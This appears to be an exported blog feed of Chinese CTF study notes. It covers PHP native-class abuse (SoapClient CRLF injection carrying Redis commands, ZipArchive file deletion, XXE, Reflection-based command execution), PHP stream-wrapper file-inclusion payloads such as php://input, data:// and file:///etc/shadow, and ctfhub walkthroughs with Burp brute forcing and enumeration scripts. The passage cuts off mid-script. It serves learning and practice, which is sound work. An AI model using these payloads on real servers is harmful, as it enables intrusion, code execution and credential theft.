<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.255.129:1234</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">User-Agent: WHOAMI</span><br><span class="line">Cookie: PHPSESSID=test</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">SOAPAction: &quot;test#a&quot;</span><br><span class="line">Content-Length: 365</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同理，还可以插入Redis命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\r\nCONFIG SET dir /var/www/html&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>也可以发送POST数据包，但是要设置<code>Content-Type</code>为<code>application/x-www-form-urlencoded</code>。</p>
<p>由于<code>Content-Type</code>的位置在UA底下，就可以通过类中的UA插入<code>Content-Type</code>，把原来的挤到底下作为POST内容</p>
<p>抄的一份payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &#x27;http://192.168.255.129:1234&#x27;;</span><br><span class="line">$poc = &quot;CONFIG SET dir /var/www/html&quot;;</span><br><span class="line">$post_data = &#x27;data=whoami&#x27;;</span><br><span class="line">$headers = array(</span><br><span class="line">    &#x27;X-Forwarded-For: 127.0.0.1&#x27;,</span><br><span class="line">    &#x27;Cookie: PHPSESSID=Cookie&#x27;</span><br><span class="line">);</span><br><span class="line">$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&quot;UA\n\rContent-Type: application/x-www-form-urlencoded\n\r&quot;.join(&quot;\n\r&quot;,$headers).&quot;\n\rContent-Length: &quot;. (string)strlen($post_data).&quot;\n\r\n\r&quot;.$post_data,&#x27;uri&#x27;=&gt;&#x27;test&#x27;));</span><br><span class="line">$a-&gt;a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>返回的结果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304181456858.png" alt="image-20230418145614812"></p>
<p>成功传入了POST内容。</p>
<h2 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h2><p>类下有个open方法，可以打开一个新的或现有的zip文档进行读取.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZipArchive::open ( string $filename [, int $flags ] ) : mixed</span><br></pre></td></tr></table></figure>

<p>flags可以指定开打的模式：</p>
<ul>
<li><p><code>ZipArchive::OVERWRITE</code>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</p>
</li>
<li><p><code>ZipArchive::CREATE</code>：如果不存在则创建一个zip压缩包。</p>
</li>
<li><p><code>ZipArchive::RDONLY</code>：只读模式打开压缩包。</p>
</li>
<li><p><code>ZipArchive::EXCL</code>：如果压缩包已经存在，则出错。</p>
</li>
<li><p><code>ZipArchive::CHECKCONS</code>：对压缩包执行额外的一致性检查，如果失败则显示错误。</p>
</li>
</ul>
<p>如果指定flags为<code>ZipArchive::OVERWRITE</code>，就可以把指定文件删除。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new ZipArchive();</span><br><span class="line">$a-&gt;open(&#x27;1.txt&#x27;,ZipArchive::OVERWRITE); </span><br></pre></td></tr></table></figure>

<p>由于没有保存，所以最后的效果就是把1.txt删除</p>
<h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>这个类用于解析XML文档中的元素。</p>
<p>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public SimpleXMLElement::__construct(</span><br><span class="line">    string $data,</span><br><span class="line">    int $options = 0,</span><br><span class="line">    bool $dataIsURL = false,</span><br><span class="line">    string $namespaceOrPrefix = &quot;&quot;,</span><br><span class="line">    bool $isPrefix = false</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>$data</code>：格式正确的XML字符串，或者XML文档的路径或URL（如果<code>$data_is_url</code>为true）。</p>
<p><code>$data_is_url</code>：默认情况下<code>$data_is_url</code>为false。使用true指定<code>$data</code>的路径或URL到一个XML文件，而不是字符串数据。</p>
<p>可以看到通过设置第三个参数 <code>$data_is_url</code> 为 <code>true</code>，我们可以实现远程xml文件的载入。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<p>当可以控制目标的调用的类的时候，就可以通过这个类进行XXE攻击。</p>
<p>攻击的手法：</p>
<p><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
<h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><h3 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h3><p>该类中有个<code>getDocComment()</code> 方法，可以获得类中函数的注释内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = new ReflectionMethod(&#x27;F&#x27;,&#x27;get&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182029027.png" alt="image-20230418202913993"></p>
<h3 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h3><p>能显示出类中的属性和方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class F&#123;</span><br><span class="line">    protected $pro;</span><br><span class="line">    private $pri;</span><br><span class="line">    protected function get()&#123;</span><br><span class="line">        echo &#x27;pro&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ref = new ReflectionClass(&#x27;F&#x27;);</span><br><span class="line">echo $ref;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182032267.png" alt="image-20230418203240233"></p>
<h3 id="ReflectionFunction"><a href="#ReflectionFunction" class="headerlink" title="ReflectionFunction"></a>ReflectionFunction</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">$func = new ReflectionFunction($a);</span><br><span class="line">echo $func-&gt;invokeArgs(array($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182152509.png" alt="image-20230418215234029"></p>
<h1 id="动态调用"><a href="#动态调用" class="headerlink" title="动态调用"></a>动态调用</h1><p>学习中看到别人的博客经常提到“动态调用”，因此去了解了一下。</p>
<p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<p>当给一个函数名赋值给一个变量时，可以通过调用这个变量来调用这个函数。</p>
<p>浅显一点的有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;system&quot;;</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">($a)($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这样相当于直接执行了<code>system(whoami)</code>命令。</p>
<p>复杂调用有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class F&#123;</span><br><span class="line">	public function sys($exec)&#123;</span><br><span class="line">		system($exec);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$n = new F();</span><br><span class="line">$a = array($n,&quot;sys&quot;);</span><br><span class="line">$b = &quot;whoami&quot;;</span><br><span class="line">$a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>其中通过数组来调用F类中的sys函数，并把<code>whoami</code>赋值给$b，传到了F类中的sys函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304182208435.png" alt="image-20230418220831410"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">CTF 中 PHP原生类的利用 – JohnFrod’s Blog</a></p>
<p><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://www.php.net/manual/zh/functions.variable-functions.php">PHP: 可变函数 - Manual</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP伪协议</title>
    <url>/2024/01/07/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>支持的协议：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — 安全外壳协议 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<h1 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h1><p>可以搭配fopen()，file_get_contents()，include()等函数搭配使用，支持相对、绝对和网络路径。但是我实测相对路径不用file:&#x2F;&#x2F;读取，直接读就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://./index.php        #相对路径读取文件#./index.php</span><br><span class="line">file:///etc/shadow  #绝对路径读取</span><br><span class="line">file://http://127.0.0.1/index.php   #网络路径读取</span><br></pre></td></tr></table></figure>

<h1 id="http-x2F-x2F-amp-https-x2F-x2F"><a href="#http-x2F-x2F-amp-https-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F;</h1><p>通过HTTP 1.0的GET方法访问网络资源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$homepage = file_get_contents(&quot;https://www.bilibili.com/&quot;);</span><br><span class="line">echo $homepage;</span><br></pre></td></tr></table></figure>

<h1 id="ftp-x2F-x2F"><a href="#ftp-x2F-x2F" class="headerlink" title="ftp:&#x2F;&#x2F;"></a>ftp:&#x2F;&#x2F;</h1><p>这个还没弄懂怎么读，好像见的也比较少，先放放</p>
<h1 id="php-x2F-x2F"><a href="#php-x2F-x2F" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h1><h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>访问请求的原始数据的只读流，可以用来接收post的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$F = $_GET[&#x27;file&#x27;];</span><br><span class="line">include($F);</span><br></pre></td></tr></table></figure>

<p>传post</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/?file=php://input</span><br><span class="line">POST DATA: &lt;?php echo system(&#x27;ls&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="php-x2F-x2F-output"><a href="#php-x2F-x2F-output" class="headerlink" title="php:&#x2F;&#x2F;output"></a>php:&#x2F;&#x2F;output</h2><p>是一个只写的数据流，可以像echo一样写入到输出中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$output = fopen(&quot;php://output&quot;, &quot;w&quot;);</span><br><span class="line">fwrite($output, &quot;test&quot;);</span><br><span class="line">fclose($output);</span><br></pre></td></tr></table></figure>

<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><p>用法: php:&#x2F;&#x2F;filter&#x2F;筛选过滤方式&#x2F;resource&#x3D;&lt;文件&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$F = &quot;php://filter/read=convert.base64-encode/resource=t.php&quot;;</span><br><span class="line">include($F);</span><br></pre></td></tr></table></figure>

<p>字符串过滤器：</p>
<ul>
<li><p>string.rot13 # 等同于用 str_rot13()函数,将26个英文字母的前面13个字符与后13个字符互换 (PHP 4.3.0)</p>
</li>
<li><p>string.toupper # 等同于用 strtoupper(),将字符串转换为大写 (PHP 5.0.0)</p>
</li>
<li><p>string.tolower # 同于用 strtolower()，将字符串转换为小写 (PHP 5.0.0)</p>
</li>
<li><p>string.strip_tags # 等同于用 strip_tags(),从字符串中去除html和php标签 (PHP 5.0.0)</p>
</li>
</ul>
<p>转换过滤器：</p>
<ul>
<li><p>convert.base64-encode</p>
</li>
<li><p>convert.base64-decode</p>
</li>
<li><p>convert.quoted-printable-encode#将 8-bit 字符串转换为quoted-printable 字符串。</p>
</li>
<li><p>convert.quoted-printable-decode#将 quoted-printable 字符串转换为 8-bit 字符串</p>
</li>
<li><p>convert.iconv</p>
<blockquote>
<p>在激活 <a href="https://www.php.net/manual/zh/book.iconv.php">iconv</a> 的前提下可以使用 <code>convert.iconv.*</code> 压缩过滤器， 等同于用 <a href="https://www.php.net/manual/zh/function.iconv.php">iconv()</a> 处理所有的流数据。 该过滤器不支持参数，但可使用输入&#x2F;输出的编码名称，组成过滤器名称，比如 <code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</code> 或 <code>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</code> </p>
</blockquote>
<p>用法如上，当rot或者base被ban的时候可以通过修改字符编码的形式找出文件内容，可以使用类似<code>php://filter/convert.iconv..UCS-2LE/resource=</code>的方式弹出文件内容</p>
</li>
</ul>
<p>压缩过滤器</p>
<ul>
<li><p>zlib.deflate和 zlib.inflate # zlib.deflate是用zlib进行文件流加密。zlib.inflate是用zlib进行文件流解密</p>
</li>
<li><p>bzip2.compress和 bzip2.decompress # 同上</p>
</li>
</ul>
<h1 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;</h1><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名</p>
<p>zip:&#x2F;&#x2F; 处理的是<code>.zip</code>后缀的压缩包，compress.zlib:&#x2F;&#x2F; 处理的是<code>.gz</code>后缀的压缩包，compress.bzip2:&#x2F;&#x2F; 处理的是<code>.bz2</code>后缀的压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://archive.zip#dir/file.txt</span><br><span class="line">即zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]**要用绝对路径+url编码#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip2:///etc/www/html/file.bz2</span><br><span class="line">也可以相对路径</span><br><span class="line">compress.bzip2://./file.bz2 #zlib同理</span><br></pre></td></tr></table></figure>

<h1 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h1><p>data:&#x2F;&#x2F;资源类型;编码,内容 （data:&#x2F;&#x2F;也可以写成data:）</p>
<p>data:&#x2F;&#x2F;协议通过执行资源类型,使后面的内容当做文件内容来执行,从而造成任意代码执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="glob-x2F-x2F"><a href="#glob-x2F-x2F" class="headerlink" title="glob:&#x2F;&#x2F;"></a>glob:&#x2F;&#x2F;</h1><p>查找匹配的文件路径模式，需要搭配DirectoryIterator类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob://[文件路径]/[文件名].[文件后缀]</span><br><span class="line"></span><br><span class="line">$it = new DirectoryIterator($_GET[&#x27;file&#x27;]);</span><br><span class="line">foreach($it as $f) &#123;</span><br><span class="line"> printf(&quot;%s&quot;, $f-&gt;getFilename());</span><br><span class="line">	echo&#x27;&lt;/br&gt;&#x27;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h1><p>和zip类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar://./php.zip/php.txt</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>flv2mp4</title>
    <url>/2024/01/07/flv2mp4/</url>
    <content><![CDATA[<p>借助FFmpeg把flv封装为mp4文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211101629273.png" alt="202211101629273.png"></p>
<p>效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211101629263.png" alt="202211101629263.png"></p>
<p>相比其他的转码，速度更快更好</p>
]]></content>
      <categories>
        <category>怪东西</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfhub练习</title>
    <url>/2024/01/07/ctfhub%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="Web前置技能"><a href="#Web前置技能" class="headerlink" title="Web前置技能"></a>Web前置技能</h1><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147545.png" alt="1"></p>
<p>注意到题中要求使用CTF**B Method，故在Burp-Suite将GET方式改为CTFHUB（区分大小写）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147440.png" alt="2"></p>
<p>将Intercept打开后打开浏览器并填入URL，将橙色标识中的GET方法改为CTFHUB后发送，得到如下flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147987.png" alt="flag"></p>
<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>打开URL如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137392.png" alt="1"></p>
<p>打开Intercept并进入HTTP history查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137699.png" alt="2"></p>
<p>发现两处302跳转，查看得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152137958.png" alt="flag"></p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>打开URL如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138827.png" alt="1"></p>
<p>得知要使用admin登陆</p>
<p>刷新拦截一下请求</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138275.png" alt="2"></p>
<p>将admin&#x3D;0改为admin&#x3D;1并发送，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152138254.png" alt="flag"></p>
<h3 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h3><p>打开URL点击click</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152145795.png" alt="1"></p>
<p>在HTTP history中查看response，注意到认证提示“Basic realm&#x3D;”Do u know admin ?””</p>
<p>猜测登陆用户名为admin</p>
<p>输入用户名密码后抓包，看到base64加密后的字符</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152145934.png" alt="2"></p>
<p>在解码器中发现是账号:密码的格式，而账号为admin</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146262.png" alt="3"></p>
<p>使用爆破模块intruder</p>
<p>将该请求发送到intruder，将basic后面的字符选中并点击右侧Add§</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146966.png" alt="4"></p>
<p>进入payloads导入ctfhub给的密码本</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146548.png" alt="5"></p>
<p>同时添加前缀admin:（注意中间的:）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146884.png" alt="6"></p>
<p>添加base64编码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146899.png" alt="7"></p>
<p>取消url编码，不然&#x3D;会被转化为%3d</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146329.png" alt="8"></p>
<p>开始爆破</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146048.png" alt="9"></p>
<p>筛选状态200并查看返回值，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152146336.png" alt="flag"></p>
<h3 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h3><p>打开URL发现是游戏</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147675.png" alt="1"></p>
<p>打开源代码发现flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152147590.png" alt="flag"></p>
<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h4 id="法一：Burp-Suite"><a href="#法一：Burp-Suite" class="headerlink" title="法一：Burp Suite"></a>法一：Burp Suite</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149039.png" alt="0"></p>
<p>注意到目录为4*4的文件夹</p>
<p>进入到最后一级目录，发送URL到intruder中</p>
<p>分别选择攻击类型：cluster bomb，选择变化的位置，设置payload的sets和options</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149124.png" alt="1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152149552.png" alt="2"></p>
<p>设置完成后开始</p>
<p>在结果页中发现长度明显不一致的返回，查看返回内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150023.png" alt="3"></p>
<p>从而得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150584.png" alt="flag"></p>
<h4 id="法二：python"><a href="#法二：python" class="headerlink" title="法二：python"></a>法二：python</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-0b7cf3fe1d9ef811.sandbox.ctfhub.com:10800/flag_in_here&quot;</span><span class="comment">#靶机url</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#i为0-4的数</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):<span class="comment">#j为0-4的数</span></span><br><span class="line">        url_final = url + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;/&quot;</span> + <span class="built_in">str</span>(j)<span class="comment">#将最终的目录拼接出来</span></span><br><span class="line">        r = requests.get(url_final)<span class="comment">#获得服务器返回的Response</span></span><br><span class="line">        r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        get_file=r.text<span class="comment">#得到text内容</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> get_file:<span class="comment">#判断flag是否在返回值中</span></span><br><span class="line">            <span class="built_in">print</span>(url_final)</span><br></pre></td></tr></table></figure>

<p>运行结果如下，得到flag目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152150607.png" alt="4"></p>
<h2 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h2><p>打开目标url，进入phpinfo界面</p>
<p>搜索flag关键词得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152148724.png" alt="flag"></p>
<h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><h4 id="法一：Burp-Suite-1"><a href="#法一：Burp-Suite-1" class="headerlink" title="法一：Burp Suite"></a>法一：Burp Suite</h4><p>打开url发现提示给了常见的文件及后缀名</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155349.png" alt="1"></p>
<p>进入bs浏览器，随便输一个，例如:web.tar尝试访问</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155308.png" alt="2"></p>
<p>在历史记录中将该次访问发送到intruder中</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155837.png" alt="3"></p>
<p>在源代码中选择攻击类型并选中web和tar</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155045.png" alt="4"></p>
<p>payloads中载入要变化的文件名</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155514.png" alt="5"></p>
<p>填写两个set后开始攻击，找到状态为200的文件，下载</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155141.png" alt="6"></p>
<p>得到flag.txt</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155970.png" alt="7"></p>
<p>将该文件放入浏览器中尝试打开得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155598.png" alt="flag"></p>
<h4 id="法二-dirsearch"><a href="#法二-dirsearch" class="headerlink" title="法二:dirsearch"></a>法二:dirsearch</h4><p>在dirsearch目录中打开powershell，执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python .\dirsearch.py -u http://challenge-584841b234301423.sandbox.ctfhub.com:10800 -e tar,tar.gz,zip,rar -x 502,503</span><br></pre></td></tr></table></figure>

<p>执行完成后得到备份文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202210152155127.png" alt="8"></p>
<p>后续步骤同法一</p>
<h4 id="法三-python"><a href="#法三-python" class="headerlink" title="法三:python"></a>法三:python</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://challenge-584841b234301423.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line">list1=[<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">list2=[<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        url_final=url+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        